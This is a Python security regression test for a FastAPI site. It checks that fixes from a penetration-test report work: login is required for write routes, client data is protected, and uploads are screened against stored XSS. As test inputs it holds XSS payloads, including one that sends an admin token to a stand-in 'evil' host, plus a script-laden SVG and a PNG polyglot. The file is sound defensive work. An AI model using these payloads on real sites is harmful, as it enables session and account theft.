"""Run: python tests/test_vapt_report_oct2026.py (no database needed).

Checks, one by one, the code-side findings of the IT team's report "Advanced Penetration Testing & Risk Assessment"
(19 October 2026): F-01 (unauthenticated PUT/DELETE), PII-01 (client data leak) and Attack Chain D (upload -> stored XSS
-> admin takeover). The server and network findings (CLOUD-01, HOST-01, DMARC) cannot be tested from code.
"""
import io
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from datetime import timedelta

from fastapi import HTTPException
from fastapi.testclient import TestClient
from PIL import Image

from app.auth.security import create_access_token
from app.main import app
from app.utils.uploads import check_pdf, require_webp

from app.utils import ratelimit

ratelimit.LIMITS["refused_per_5min"] = 10 ** 6   # this test deliberately makes hundreds of refused calls from one address
c = TestClient(app, raise_server_exceptions=False)
spec = app.openapi()
ok = True


def check(name, cond, extra=""):
    global ok
    ok &= bool(cond)
    print(("PASS " if cond else "FAIL ") + name, extra)


def fill(path: str) -> str:
    return re.sub(r"\{[^}]+\}", "64b1f0c2a1b2c3d4e5f60718", path)


# ── F-01: nobody can change or delete anything without logging in ──
writes = [(m.upper(), p, op) for p, ops in spec["paths"].items() for m, op in ops.items() if m.upper() in {"PUT", "PATCH", "DELETE"}]
open_writes = [f"{m} {p}" for m, p, op in writes if not op.get("security")]
check("F-01: no PUT / PATCH / DELETE route is open to the public", not open_writes, open_writes)
statuses = {}
for m, p, _ in writes:
    statuses[(m, p)] = c.request(m, fill(p), json={}).status_code
bad = {k: v for k, v in statuses.items() if v not in (401, 403)}
check(f"F-01: all {len(writes)} PUT / PATCH / DELETE calls without a login are refused (401)", not bad, bad)

# every state-changing POST except the public forms / sign-in also needs a login
PUBLIC_POST = {
    "/api/auth/signup", "/api/auth/login", "/api/auth/google", "/api/admin/login", "/api/admin/login-form",
    "/api/contact/", "/api/alumni/", "/api/feedback/", "/api/cookie-consent/", "/api/careers/auth/google", "/api/consulting/auth/google",
    "/api/events/{event_id}/register", "/api/notifications/unsubscribe", "/api/notifications/resubscribe", "/api/notifications/unsubscribe-one-click",
}
posts = [p for p, ops in spec["paths"].items() for m, op in ops.items() if m == "post" and p not in PUBLIC_POST]
bad = {p: c.post(fill(p), json={}).status_code for p in posts}
bad = {p: s for p, s in bad.items() if s not in (401, 403)}
check(f"F-01: all {len(posts)} other POST routes need a login", not bad, bad)

# ── PII-01: client data endpoints are not readable by strangers ──
pii = ["/api/contact/", "/api/alumni/", "/api/proposal/", "/api/feedback/", "/api/users/admin", "/api/careers/admin/applications",
       "/api/appointments/admin", "/api/consulting/admin/requests", "/api/admin/contacts", "/api/admin/alumni", "/api/export/contacts",
       "/api/export/users", "/api/export/feedback", "/api/proposal/export", "/api/dashboard/stats", "/api/admin/email-health"]
got = {p: c.get(p).status_code for p in pii}
bad = {p: s for p, s in got.items() if s not in (401, 403, 404)}
check("PII-01: contacts, alumni, proposals, feedback, users, applications and exports refuse anonymous readers", not bad, bad)
open_gets = [p for p, ops in spec["paths"].items() if "get" in ops and not ops["get"].get("security")]
sensitive = [p for p in open_gets if re.search(r"contact|alumni|proposal|feedback|users|applic|appointment|consult|export|admin", p)]
check("PII-01: no public GET route has a personal-data name", not sensitive, sensitive)

# a visitor account (not an admin) is not enough either
visitor = {"Authorization": "Bearer " + create_access_token({"sub": "v@x.com", "uid": "u1", "type": "site_user"}, expires_delta=timedelta(hours=1))}
bad = {p: c.get(p, headers=visitor).status_code for p in ("/api/contact/", "/api/alumni/", "/api/proposal/", "/api/users/admin")}
check("PII-01: a signed-in visitor still cannot read client data", all(s in (401, 403) for s in bad.values()), bad)

# ── Attack chain D: upload -> stored XSS -> admin takeover ──
check("Chain D: /api/articles/upload needs a login", c.post("/api/articles/upload", data={"title": "x"}).status_code in (401, 403))


def refused(data: bytes) -> bool:
    try:
        require_webp(data)
    except HTTPException:
        return True
    return False


html = b"<html><script>fetch('//evil/?t='+localStorage.admin_token)</script></html>"
svg = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(document.cookie)</script></svg>'
check("Chain D: an .html file sent as an 'image' is refused", refused(html))
check("Chain D: an .svg with a script sent as an 'image' is refused", refused(svg))
check("Chain D: JavaScript sent as an 'image' is refused", refused(b"alert(document.cookie)"))
polyglot = io.BytesIO()
Image.new("RGB", (8, 8), "red").save(polyglot, format="PNG")
real = polyglot.getvalue() + b"<script>alert(1)</script>"
out = require_webp(real)
check("Chain D: a real picture is re-encoded to WebP and the hidden script is dropped", out[:4] == b"RIFF" and out[8:12] == b"WEBP" and b"<script" not in out)
for label, data in (("HTML", html), ("SVG", svg), ("JavaScript", b"alert(1)")):
    try:
        check_pdf(data)
        refused_pdf = False
    except HTTPException:
        refused_pdf = True
    check(f"Chain D: {label} sent as a 'PDF' is refused", refused_pdf)

# ── headers that stop uploaded files running as pages ──
r = c.get("/api/")
check("responses carry X-Content-Type-Options: nosniff", r.headers.get("x-content-type-options", "").lower() == "nosniff")
print("ALL PASS" if ok else "SOME FAILED")
